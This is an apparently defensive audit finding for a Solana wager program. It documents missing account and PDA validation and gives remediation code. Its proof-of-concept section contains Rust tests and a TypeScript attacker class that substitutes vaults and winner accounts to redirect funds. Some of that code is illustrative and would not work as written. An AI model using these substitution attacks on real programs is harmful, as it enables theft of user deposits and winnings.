# VUL-011: Account Validation Bypass

## 🚨 Critical Vulnerability Summary

**Vulnerability ID**: VUL-011
**CVSS Score**: 9.3/10.0 (Critical)
**CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
**Discovery Date**: 2025-09-18
**Status**: Confirmed
**Reporter**: RECTOR

## 📍 Location & Scope

**Affected Files**:
- `programs/wager-program/src/lib.rs:15-85` (Account struct definitions)
- `programs/wager-program/src/instructions/join_user.rs:8-25`
- `programs/wager-program/src/instructions/distribute_winnings.rs:8-35`
- `programs/wager-program/src/instructions/refund_wager.rs:8-25`

**Affected Functions**:
- All instruction handlers with account validation
- PDA derivation and verification
- Account ownership checks

**Contract Component**:
- [x] Escrow System
- [x] Access Control
- [x] Game Logic
- [x] Token Management
- [x] PDA Security

## 🔍 Technical Analysis

### Root Cause
The protocol lacks proper account validation, allowing attackers to substitute malicious accounts, bypass ownership checks, and manipulate Program Derived Addresses (PDAs). Critical account constraints are missing or improperly implemented.

### Attack Vector
1. **Account Substitution**: Providing fake accounts in instruction calls
2. **PDA Manipulation**: Using incorrect or malicious PDA derivations
3. **Ownership Bypass**: Circumventing account ownership requirements
4. **Signer Impersonation**: Using unauthorized signers

### Code Analysis
```rust
// VULNERABLE CODE in lib.rs - Account struct definitions
#[derive(Accounts)]
pub struct JoinUser<'info> {
    #[account(mut)]
    pub game_session: Account<'info, GameSession>, // ❌ NO VALIDATION OF SESSION LEGITIMACY

    pub user: Signer<'info>, // ❌ NO VALIDATION OF USER ELIGIBILITY

    // ❌ MISSING VAULT VALIDATION
    #[account(mut)]
    pub user_token_account: Account<'info, TokenAccount>, // ❌ NO OWNERSHIP CHECK

    // ❌ MISSING PROGRAM TOKEN ACCOUNT VALIDATION
    #[account(mut)]
    pub vault: Account<'info, TokenAccount>, // ❌ NO PDA CONSTRAINT

    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
pub struct DistributeWinnings<'info> {
    #[account(mut)]
    pub game_session: Account<'info, GameSession>, // ❌ NO STATE VALIDATION

    pub game_server: Signer<'info>, // ❌ NO AUTHORITY VALIDATION (from VUL-007)

    #[account(mut)]
    pub vault: Account<'info, TokenAccount>, // ❌ NO PDA VERIFICATION

    // ❌ WINNER ACCOUNTS HAVE NO VALIDATION
    #[account(mut)]
    pub winner1: Account<'info, TokenAccount>,
    #[account(mut)]
    pub winner2: Account<'info, TokenAccount>,
    #[account(mut)]
    pub winner3: Account<'info, TokenAccount>,
    #[account(mut)]
    pub winner4: Account<'info, TokenAccount>,
    #[account(mut)]
    pub winner5: Account<'info, TokenAccount>,

    pub token_program: Program<'info, Token>,
}
```

```rust
// VULNERABLE PDA DERIVATION - Missing validation
#[derive(Accounts)]
#[instruction(session_id: String)]
pub struct CreateGameSession<'info> {
    #[account(
        init,
        payer = game_server,
        space = GameSession::SPACE,
        // ❌ PDA SEEDS NOT VALIDATED PROPERLY
        seeds = [b"game_session", session_id.as_bytes()],
        bump
    )]
    pub game_session: Account<'info, GameSession>,

    // ❌ NO VAULT PDA CONSTRAINT
    #[account(
        init,
        payer = game_server,
        space = TokenAccount::LEN,
        // ❌ MISSING PDA RELATIONSHIP TO SESSION
    )]
    pub vault: Account<'info, TokenAccount>,

    #[account(mut)]
    pub game_server: Signer<'info>,
}
```

**Critical Issues**:
1. **No account ownership validation**
2. **Missing PDA constraint verification**
3. **No token account authority checks**
4. **Insufficient account relationship validation**
5. **Missing state consistency checks**

## 💥 Impact Assessment

### Technical Impact
**Account Validation Bypass Consequences**:
- Substitute malicious accounts for legitimate ones
- Redirect funds to attacker-controlled accounts
- Bypass game session validation
- Manipulate vault accounts

### Financial Impact
**Economic Exploitation through Account Manipulation**:

**Example Attack 1 - Vault Substitution**:
- Attacker creates fake vault account
- Substitutes it in distribute_winnings call
- All winnings go to attacker's vault
- Legitimate vault remains empty

**Example Attack 2 - Winner Account Substitution**:
- Game completes with legitimate winners
- Attacker calls distribute_winnings with fake winner accounts
- All payouts go to attacker-controlled accounts
- Real winners receive nothing

**Example Attack 3 - Session Hijacking**:
- Attacker creates fake game session account
- Uses same session ID as legitimate game
- Players join fake session unknowingly
- Attacker controls fake session and funds

### Protocol Impact
- [x] **Complete account security model bypass**
- [x] **Fund redirection to unauthorized accounts**
- [x] **Session legitimacy undermined**
- [x] **PDA security model broken**
- [x] **Protocol trust destroyed**

### User Impact
- [x] **Funds sent to wrong accounts**
- [x] **Winnings stolen by attackers**
- [x] **Joining wrong game sessions**
- [x] **Complete loss of deposited funds**

### Business Impact
- [x] **Account system completely unreliable**
- [x] **Financial security destroyed**
- [x] **User trust permanently damaged**
- [x] **Legal liability for stolen funds**

## 🔬 Proof of Concept

### Account Substitution Attack
```rust
#[cfg(test)]
mod test_account_validation_bypass {
    use super::*;

    #[test]
    fn test_vault_substitution_attack() {
        let legitimate_session = create_test_game_session("real_game", 1000);
        let legitimate_vault = create_vault_for_session("real_game");

        // Attacker creates fake vault
        let attacker_vault = create_attacker_controlled_vault();

        // Distribute winnings call with substituted vault
        let fake_ctx = Context::new(
            &program_id,
            &mut DistributeWinnings {
                game_session: legitimate_session, // Real session
                game_server: fake_authority(),
                vault: attacker_vault, // ❌ Fake vault substituted!
                winner1: attacker_account(),
                winner2: attacker_account(),
                winner3: attacker_account(),
                winner4: attacker_account(),
                winner5: attacker_account(),
                token_program: token_program(),
            },
            &[]
        );

        // This should fail but doesn't due to missing validation
        let result = distribute_winnings_handler(fake_ctx, "real_game".to_string(), 0);

        // Attacker successfully steals all funds
        assert!(result.is_ok());
        assert_eq!(get_vault_balance(attacker_vault), 10000); // All funds stolen
    }

    #[test]
    fn test_session_substitution() {
        let real_session = create_test_game_session("target_game", 5000);
        let fake_session = create_attacker_session("target_game", 1); // Same ID, low bet

        // User tries to join "target_game"
        let join_ctx = Context::new(
            &program_id,
            &mut JoinUser {
                game_session: fake_session, // ❌ Fake session substituted
                user: legitimate_user(),
                user_token_account: user_account(),
                vault: attacker_vault(), // ❌ Attacker's vault
                token_program: token_program(),
                system_program: system_program(),
            },
            &[]
        );

        // User joins fake session unknowingly
        let result = join_user_handler(join_ctx, "target_game".to_string(), 0);
        assert!(result.is_ok());

        // User's 5000 tokens go to attacker's fake session
    }

    #[test]
    fn test_pda_derivation_bypass() {
        let session_id = "legitimate_session";

        // Correct PDA derivation
        let (real_session_pda, _) = Pubkey::find_program_address(
            &[b"game_session", session_id.as_bytes()],
            &program_id
        );

        // Attacker creates account at different address
        let fake_session_pda = Keypair::new().pubkey();

        // Instructions accept fake PDA due to missing constraint validation
        // This breaks the entire PDA security model
    }
}
```

### Real-World Account Substitution Attack
```typescript
class AccountSubstitutionAttacker {
    private attackerKeypair: Keypair;
    private fakeVault: PublicKey;

    async setupAttack(): Promise<void> {
        // 1. Create attacker-controlled vault
        this.fakeVault = await this.createAttackerVault();

        // 2. Create fake winner accounts
        this.fakeWinners = await this.createFakeWinnerAccounts();
    }

    async hijackWinningDistribution(sessionId: string): Promise<void> {
        // 1. Get legitimate session PDA
        const realSessionPDA = this.getSessionPDA(sessionId);

        // 2. Call distribute_winnings with substituted accounts
        await this.wagerProgram.methods
            .distributeWinnings(sessionId, 0) // Declare team 0 winner
            .accounts({
                gameSession: realSessionPDA, // Real session (for legitimacy)
                gameServer: this.fakeAuthority.publicKey,
                vault: this.fakeVault, // ❌ ATTACKER'S VAULT SUBSTITUTED
                winner1: this.fakeWinners[0], // ❌ ALL ATTACKER ACCOUNTS
                winner2: this.fakeWinners[1],
                winner3: this.fakeWinners[2],
                winner4: this.fakeWinners[3],
                winner5: this.fakeWinners[4],
                tokenProgram: TOKEN_PROGRAM_ID,
            })
            .signers([this.fakeAuthority])
            .rpc();

        // 3. All winnings transferred to attacker accounts
        console.log("Successfully hijacked winnings distribution");
    }

    async redirectUserDeposits(targetSessionId: string): Promise<void> {
        // 1. Monitor for users trying to join target session
        // 2. Front-run with fake session creation

        const fakeSessionKeypair = Keypair.generate();

        // 3. Create fake session with same ID
        await this.wagerProgram.methods
            .createGameSession(
                targetSessionId, // Same ID as legitimate session
                1, // Minimal bet to attract users
                GameMode.WinnerTakesAllFiveVsFive
            )
            .accounts({
                gameSession: fakeSessionKeypair.publicKey, // Fake session
                vault: this.fakeVault, // Attacker's vault
                gameServer: this.attackerKeypair.publicKey,
                systemProgram: SystemProgram.programId,
            })
            .signers([this.attackerKeypair, fakeSessionKeypair])
            .rpc();

        // 4. Users join fake session, funds go to attacker vault
    }

    private async createAttackerVault(): Promise<PublicKey> {
        // Create token account controlled by attacker
        return await createAccount(
            this.connection,
            this.attackerKeypair,
            this.tokenMint,
            this.attackerKeypair.publicKey
        );
    }
}
```

## ⚡ Exploitability Analysis

**Likelihood**: High (account validation is fundamental)
**Complexity**: Medium (requires understanding of account model)
**Prerequisites**:
- Knowledge of Solana account model
- Understanding of PDA derivation
- Ability to create fake accounts

**Attack Vectors**:
- [x] **Vault account substitution**
- [x] **Winner account manipulation**
- [x] **Session account hijacking**
- [x] **PDA constraint bypass**

## 🔧 Remediation

### Recommended Fix
Implement comprehensive account validation with proper constraints and PDA verification.

### Code Patch
```rust
// FIXED CODE with proper account validation
use anchor_lang::prelude::*;

// ✅ SECURE ACCOUNT CONSTRAINTS
#[derive(Accounts)]
#[instruction(session_id: String)]
pub struct SecureJoinUser<'info> {
    // ✅ VALIDATE SESSION PDA CORRECTLY
    #[account(
        mut,
        constraint = game_session.key() == get_session_pda(&session_id).0 @ WagerError::InvalidSessionPDA,
        constraint = game_session.status == GameStatus::WaitingForPlayers @ WagerError::InvalidGameState
    )]
    pub game_session: Account<'info, GameSession>,

    pub user: Signer<'info>,

    // ✅ VALIDATE USER TOKEN ACCOUNT OWNERSHIP
    #[account(
        mut,
        constraint = user_token_account.owner == user.key() @ WagerError::InvalidTokenAccountOwner,
        constraint = user_token_account.mint == EXPECTED_TOKEN_MINT @ WagerError::InvalidTokenMint
    )]
    pub user_token_account: Account<'info, TokenAccount>,

    // ✅ VALIDATE VAULT PDA RELATIONSHIP
    #[account(
        mut,
        constraint = vault.key() == get_vault_pda(&session_id).0 @ WagerError::InvalidVaultPDA,
        constraint = vault.owner == get_vault_authority().0 @ WagerError::InvalidVaultAuthority
    )]
    pub vault: Account<'info, TokenAccount>,

    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
}

// ✅ SECURE WINNINGS DISTRIBUTION
#[derive(Accounts)]
#[instruction(session_id: String)]
pub struct SecureDistributeWinnings<'info> {
    // ✅ VALIDATE SESSION AND STATE
    #[account(
        mut,
        constraint = game_session.key() == get_session_pda(&session_id).0 @ WagerError::InvalidSessionPDA,
        constraint = game_session.status == GameStatus::Completed @ WagerError::GameNotCompleted
    )]
    pub game_session: Account<'info, GameSession>,

    // ✅ VALIDATE AUTHORITY (from VUL-007 fix)
    #[account(
        constraint = game_server.key() == GAME_SERVER_AUTHORITY @ WagerError::UnauthorizedServer
    )]
    pub game_server: Signer<'info>,

    // ✅ VALIDATE VAULT PDA
    #[account(
        mut,
        constraint = vault.key() == get_vault_pda(&session_id).0 @ WagerError::InvalidVaultPDA
    )]
    pub vault: Account<'info, TokenAccount>,

    // ✅ VALIDATE WINNER ACCOUNTS ARE LEGITIMATE PLAYERS
    #[account(
        mut,
        constraint = validate_winner_account(&game_session, &winner1, 0, 0)? @ WagerError::InvalidWinnerAccount
    )]
    pub winner1: Account<'info, TokenAccount>,

    #[account(
        mut,
        constraint = validate_winner_account(&game_session, &winner2, 0, 1)? @ WagerError::InvalidWinnerAccount
    )]
    pub winner2: Account<'info, TokenAccount>,

    #[account(
        mut,
        constraint = validate_winner_account(&game_session, &winner3, 0, 2)? @ WagerError::InvalidWinnerAccount
    )]
    pub winner3: Account<'info, TokenAccount>,

    #[account(
        mut,
        constraint = validate_winner_account(&game_session, &winner4, 0, 3)? @ WagerError::InvalidWinnerAccount
    )]
    pub winner4: Account<'info, TokenAccount>,

    #[account(
        mut,
        constraint = validate_winner_account(&game_session, &winner5, 0, 4)? @ WagerError::InvalidWinnerAccount
    )]
    pub winner5: Account<'info, TokenAccount>,

    pub token_program: Program<'info, Token>,
}

// ✅ SECURE PDA DERIVATION FUNCTIONS
pub fn get_session_pda(session_id: &str) -> (Pubkey, u8) {
    Pubkey::find_program_address(
        &[b"game_session", session_id.as_bytes()],
        &crate::ID
    )
}

pub fn get_vault_pda(session_id: &str) -> (Pubkey, u8) {
    Pubkey::find_program_address(
        &[b"game_vault", session_id.as_bytes()],
        &crate::ID
    )
}

pub fn get_vault_authority() -> (Pubkey, u8) {
    Pubkey::find_program_address(
        &[b"vault_authority"],
        &crate::ID
    )
}

// ✅ WINNER VALIDATION FUNCTION
pub fn validate_winner_account(
    game_session: &GameSession,
    winner_account: &Account<TokenAccount>,
    team: u8,
    player_index: usize
) -> Result<bool> {
    // Validate that the winner account belongs to actual player in the game
    let expected_player = match team {
        0 => game_session.team_a.players.get(player_index),
        1 => game_session.team_b.players.get(player_index),
        _ => return Ok(false),
    };

    let expected_player = expected_player.ok_or(WagerError::InvalidPlayerIndex)?;

    // Check if winner account authority matches player
    Ok(winner_account.owner == *expected_player)
}

// ✅ COMPREHENSIVE ACCOUNT VALIDATION
impl GameSession {
    pub fn validate_all_accounts(&self, ctx: &Context<SecureJoinUser>) -> Result<()> {
        // Validate session integrity
        require!(
            self.session_id.len() > 0 && self.session_id.len() <= 50,
            WagerError::InvalidSessionId
        );

        // Validate account relationships
        require!(
            ctx.accounts.vault.mint == ctx.accounts.user_token_account.mint,
            WagerError::TokenMintMismatch
        );

        // Validate PDA derivations
        let (expected_vault_pda, _) = get_vault_pda(&self.session_id);
        require!(
            ctx.accounts.vault.key() == expected_vault_pda,
            WagerError::InvalidVaultPDA
        );

        Ok(())
    }
}
```

### Additional Security Measures
```rust
// ✅ ACCOUNT VERIFICATION MIDDLEWARE
pub fn verify_account_legitimacy<T: AccountSerialize + AccountDeserialize + Clone>(
    account: &Account<T>,
    expected_owner: &Pubkey,
    expected_data_len: usize,
) -> Result<()> {
    // Verify account ownership
    require!(
        account.owner == *expected_owner,
        WagerError::InvalidAccountOwner
    );

    // Verify account data length
    require!(
        account.data_len() == expected_data_len,
        WagerError::InvalidAccountDataLength
    );

    Ok(())
}

// ✅ PDA SECURITY HELPERS
pub mod pda_security {
    use super::*;

    pub fn verify_pda_derivation(
        account: &Pubkey,
        seeds: &[&[u8]],
        program_id: &Pubkey,
    ) -> Result<u8> {
        let (expected_pda, bump) = Pubkey::find_program_address(seeds, program_id);
        require!(
            account == &expected_pda,
            WagerError::InvalidPDADerivation
        );
        Ok(bump)
    }

    pub fn create_pda_constraint(
        seeds: &[&[u8]],
        bump: u8,
        program_id: &Pubkey,
    ) -> Pubkey {
        Pubkey::create_program_address(seeds, bump, program_id)
            .expect("Invalid PDA derivation")
    }
}
```

### Error Handling
```rust
// ADD to errors.rs
#[error_code]
pub enum WagerError {
    // ... existing errors

    #[msg("Invalid session PDA - account does not match expected derivation")]
    InvalidSessionPDA,

    #[msg("Invalid vault PDA - vault account does not match session")]
    InvalidVaultPDA,

    #[msg("Invalid token account owner - account not owned by expected user")]
    InvalidTokenAccountOwner,

    #[msg("Invalid vault authority - vault not controlled by program")]
    InvalidVaultAuthority,

    #[msg("Invalid winner account - account not owned by game player")]
    InvalidWinnerAccount,

    #[msg("Invalid token mint - token account uses wrong mint")]
    InvalidTokenMint,

    #[msg("Token mint mismatch between accounts")]
    TokenMintMismatch,

    #[msg("Invalid PDA derivation - account address incorrect")]
    InvalidPDADerivation,

    #[msg("Invalid account owner")]
    InvalidAccountOwner,

    #[msg("Invalid account data length")]
    InvalidAccountDataLength,
}
```

## ✅ Testing & Verification

### Test Cases Required
- [x] Account substitution prevention
- [x] PDA validation enforcement
- [x] Winner account legitimacy checks
- [x] Vault account security
- [x] Authority validation integration
- [x] Cross-account relationship validation

### Verification Script
```bash
# Test account validation
cargo test test_account_constraint_enforcement
cargo test test_pda_security_validation
cargo test test_account_substitution_prevention
cargo test test_winner_validation
```

### Acceptance Criteria
- [ ] All accounts properly constrained and validated
- [ ] PDA derivations verified against expected values
- [ ] Account substitution attacks prevented
- [ ] Proper error messages for validation failures
- [ ] Cross-account relationships enforced

## 🔗 References

### Related Vulnerabilities
- **VUL-007**: Authority bypass (account validation component)
- **VUL-008**: Session ID collision (PDA security)
- **VUL-098**: Session hijacking chain (uses account bypass)

### Security Resources
- [Solana Account Model Security](https://docs.solana.com/developing/programming-model/accounts)
- [Anchor Account Constraints](https://project-serum.github.io/anchor/tutorials/tutorial-2.html)
- [PDA Security Best Practices](URL)

---

**Classification**: Critical
**Priority**: P0 - Fix Immediately
**Estimated Fix Time**: 10-12 hours (comprehensive account validation + testing)
**Review Required**: Account Security Team + PDA Architecture Review + Penetration Testing

*This vulnerability enables complete bypass of account security, allowing fund theft through account substitution.*